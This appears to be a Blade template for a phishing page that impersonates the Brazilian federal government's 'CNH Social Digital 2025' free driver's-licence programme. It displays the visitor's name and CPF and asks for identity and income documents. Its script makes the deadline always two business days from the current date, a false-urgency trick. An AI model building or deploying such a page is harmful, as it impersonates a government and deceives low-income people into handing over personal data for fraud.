@extends('layouts.app')
@section('content')
    <div class="min-h-screen bg-background flex flex-col">
        @include('components.header')  
        <main class="flex-1 px-4 py-6">
            <div class="max-w-2xl mx-auto">
                <div class="bg-card rounded-lg shadow-md border border-border p-6 mb-6">
                    <h2 class="text-xl font-semibold text-foreground mb-2">Olá, <span class="firstName uppercase"></span>!</h2>
                    <p class="text-sm text-muted-foreground">CPF: <span class="cpf"></span></p>
                </div>
                <div class="bg-card rounded-lg shadow-md border border-border p-6 space-y-6">
                    <div class="text-center space-y-3">
                        <h1 class="text-2xl md:text-3xl font-bold text-govBlue">CNH Social Digital 2025: A Oportunidade de Realizar o Seu Sonho</h1>
                        <p class="text-sm text-foreground leading-relaxed">O Governo Federal, através do programa <strong>CNH Social</strong>, oferece a oportunidade de obter a Carteira Nacional de Habilitação totalmente gratuita. Se você atende aos critérios, essa pode ser a sua chance de conquistar a tão sonhada CNH que falta em sua vida, tornando-se um cidadão habilitado para dirigir.</p>
                    </div>
                    <div class="bg-brazilGreen/10 border-l-4 border-brazilGreen p-4 rounded">
                        <h2 class="text-lg font-bold text-brazilGreen mb-2">INSCRIÇÕES ABERTAS!</h2>
                        <p class="text-sm text-foreground"><strong>De 10/11/2025 a <span class="termino"></span></strong></p>
                        <p class="text-sm text-foreground mb-4">Consulte o edital de seu município para mais informações e faça já a sua inscrição!</p>
                        <div class="text-center">
                            <button class="btnVerificar inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-11 rounded-md bg-govBlue hover:bg-govBlue/90 text-white px-8 py-6 text-base font-semibold">
                                Verificar Elegibilidade
                            </button>
                        </div>
                    </div>
                    <div class="bg-brazilYellow/10 border-l-4 border-brazilYellow p-4 rounded">
                        <h2 class="text-lg font-bold text-foreground mb-3">ATENÇÃO!</h2>
                        <p class="text-sm text-foreground leading-relaxed mb-3">A CNH Social Digital 2025 é um programa do <strong>Governo Federal</strong> que visa garantir o acesso à primeira habilitação (categoria AB) de forma totalmente gratuita aos brasileiros de baixa renda que se enquadrem nos critérios estabelecidos. Ao fim, você terá sua CNH física e receberá o certificado que comprova sua habilitação (categoria A ou B) ao fim do curso prático, que permite a condução de veículos das categorias treinadas durante o curso, até a emissão da CNH definitiva.</p>
                        <p class="text-sm text-foreground leading-relaxed">Não deixe passar essa chance de <strong>melhorar a mobilidade e conquistar a cidadania</strong> necessária ao trabalho.</p>
                        <p class="text-sm text-foreground leading-relaxed mt-3"><strong>Processo 100% Digital:</strong> Candidatar-se ao programa e <strong>acompanhar sua inscrição de forma totalmente online</strong>.</p>
                    </div>
                    <div class="space-y-4">
                        <h2 class="text-lg font-bold text-foreground">Para verificar se você pode obter a CNH facilmente, siga os passos abaixo:</h2>
                        <div class="space-y-3">
                            <div class="flex gap-3 items-start">
                                <div class="bg-govBlue text-white rounded-full p-2 flex-shrink-0">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-file-text h-5 w-5"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"></path><path d="M14 2v4a2 2 0 0 0 2 2h4"></path><path d="M10 9H8"></path><path d="M16 13H8"></path><path d="M16 17H8"></path></svg>
                                </div>
                                <div>
                                    <p class="text-sm font-semibold text-foreground">Tenha seus dados em mãos</p>
                                    <p class="text-sm text-muted-foreground">CPF, RG e comprovante de renda</p>
                                </div>
                            </div>
                            <div class="flex gap-3 items-start">
                                <div class="bg-govBlue text-white rounded-full p-2 flex-shrink-0">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check h-5 w-5"><circle cx="12" cy="12" r="10"></circle><path d="m9 12 2 2 4-4"></path></svg>
                                </div>
                                <div>
                                    <p class="text-sm font-semibold text-foreground">Preencha todos os dados no site da Receita Federal</p>
                                    <p class="text-sm text-muted-foreground">Acesso gov.br (nível bronze ou acima)</p>
                                </div>
                            </div>
                            <div class="flex gap-3 items-start">
                                <div class="bg-govBlue text-white rounded-full p-2 flex-shrink-0">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-calendar h-5 w-5"><path d="M8 2v4"></path><path d="M16 2v4"></path><rect width="18" height="18" x="3" y="4" rx="2"></rect><path d="M3 10h18"></path></svg>
                                </div>
                                <div>
                                    <p class="text-sm font-semibold text-foreground">Realize um único protocolo enviar toda a documentação via site gov.br</p>
                                    <p class="text-sm text-muted-foreground">Após enquadramento, siga as instruções de envio da sua documentação</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="space-y-4">
                        <h2 class="text-lg font-bold text-govBlue text-center">Descubra se Você Pode Participar do CNH Social Digital 2025</h2>
                        <div class="text-center my-4">
                            <button class="btnVerificar inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-11 rounded-md bg-govBlue hover:bg-govBlue/90 text-white px-8 py-6 text-base font-semibold">
                                Verificar Elegibilidade
                            </button>
                        </div>
                        <div class="space-y-3">
                            <div class="flex gap-2 items-start">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check h-5 w-5 text-brazilGreen flex-shrink-0 mt-0.5"><circle cx="12" cy="12" r="10"></circle><path d="m9 12 2 2 4-4"></path></svg>
                                <p class="text-sm text-foreground"><strong>Ter CPF ativo:</strong> O programa é exclusivo a candidatos brasileiros com cadastros ativos em qualquer parte do Brasil.</p>
                            </div>
                            <div class="flex gap-2 items-start">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check h-5 w-5 text-brazilGreen flex-shrink-0 mt-0.5"><circle cx="12" cy="12" r="10"></circle><path d="m9 12 2 2 4-4"></path></svg>
                                <p class="text-sm text-foreground"><strong>Não possuir CNH:</strong> O programa é destinado apenas à primeira habilitação. Aqueles que já possuem CNH e querem mudar de categoria ou renovar não são elegíveis.</p>
                            </div>
                            <div class="flex gap-2 items-start">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check h-5 w-5 text-brazilGreen flex-shrink-0 mt-0.5"><circle cx="12" cy="12" r="10"></circle><path d="m9 12 2 2 4-4"></path></svg>
                                <p class="text-sm text-foreground"><strong>Ter mais de 18 anos ou emancipado:</strong> É necessário ter, no mínimo, 18 anos completos. Menores emancipados também podem fazer parte.</p>
                            </div>
                            <div class="flex gap-2 items-start">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check h-5 w-5 text-brazilGreen flex-shrink-0 mt-0.5"><circle cx="12" cy="12" r="10"></circle><path d="m9 12 2 2 4-4"></path></svg>
                                <p class="text-sm text-foreground"><strong>Renda familiar per capita de até meio salário mínimo:</strong> Ou seja, a renda de toda a família dividida pelos membros não pode exceder R$ 706,00 por pessoa.</p>
                            </div>
                            <div class="flex gap-2 items-start">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check h-5 w-5 text-brazilGreen flex-shrink-0 mt-0.5"><circle cx="12" cy="12" r="10"></circle><path d="m9 12 2 2 4-4"></path></svg>
                                <p class="text-sm text-foreground"><strong>Atender a outras critérios locais:</strong> Cada estado pode ter outros critérios específicos, como residir no estado há um determinado tempo ou estar no Cadastro Único, para poder se enquadrar na prioridade.</p>
                            </div>
                        </div>
                    </div>
                    <div class="bg-gradient-to-r from-govBlue/10 to-brazilGreen/10 p-4 rounded-lg space-y-4">
                        <h2 class="text-lg font-bold text-foreground text-center">Resultado do Processo Seletivo 2025</h2>
                        <div class="space-y-3">
                            <div class="flex gap-3 items-start">
                                <div class="bg-white rounded-full p-2 flex-shrink-0">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-calendar h-5 w-5 text-govBlue"><path d="M8 2v4"></path><path d="M16 2v4"></path><rect width="18" height="18" x="3" y="4" rx="2"></rect><path d="M3 10h18"></path></svg>
                                </div>
                                <div>
                                    <p class="text-sm font-semibold text-foreground">A data de divulgação:</p>
                                    <p class="text-sm text-muted-foreground">A partir de 28/03/2026</p>
                                </div>
                            </div>
                            <div class="flex gap-3 items-start">
                                <div class="bg-white rounded-full p-2 flex-shrink-0">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user h-5 w-5 text-govBlue"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                                </div>
                                <div>
                                    <p class="text-sm font-semibold text-foreground">No site oficial do DETRAN:</p>
                                    <p class="text-sm text-muted-foreground">O resultado oficial será divulgado</p>
                                </div>
                            </div>
                            <div class="flex gap-3 items-start">
                                <div class="bg-white rounded-full p-2 flex-shrink-0">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-file-text h-5 w-5 text-govBlue"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"></path><path d="M14 2v4a2 2 0 0 0 2 2h4"></path><path d="M10 9H8"></path><path d="M16 13H8"></path><path d="M16 17H8"></path></svg>
                                </div>
                                <div>
                                    <p class="text-sm font-semibold text-foreground">Após enquadramento no programa:</p>
                                    <p class="text-sm text-muted-foreground">Após envio documentação e resultado positivo, aguarde contato</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main> 
        <footer class="mt-8 py-6 border-t border-border bg-card">
            <div class="max-w-4xl mx-auto px-4 text-center text-sm text-muted-foreground">&copy; {{date('Y')}} <strong>Governo Federal</strong>. Todos os direitos reservados.</div>
        </footer>
    </div>
@endsection
@section('javascript')
    <script>
        const userData = JSON.parse(sessionStorage.getItem("userData"));
        if(!userData){
            window.location.href = "{{url('/login')}}";
        } 
        const primeiroNome = userData.NOME.split(' ')[0];
        $('.firstName').text(primeiroNome);
        $('.cpf').text(userData.CPF);

        function addBusinessDays(date, days) {
            const result = new Date(date);
            let added = 0;

            while (added < days) {
                result.setDate(result.getDate() + 1);
                const day = result.getDay();

                if (day !== 0 && day !== 6) {
                    added++;
                }
            }

            return result;
        }

        function formatDate(date) {
            return date.toLocaleDateString("pt-BR");
        }

        const hoje = new Date();
        const novaData = addBusinessDays(hoje, 2);
        $('.termino').text(formatDate(novaData));

        $(document).on('click', '.btnVerificar', function(){
            window.location.href = "{{url('/verificacao')}}"
        })
    </script>
@endsection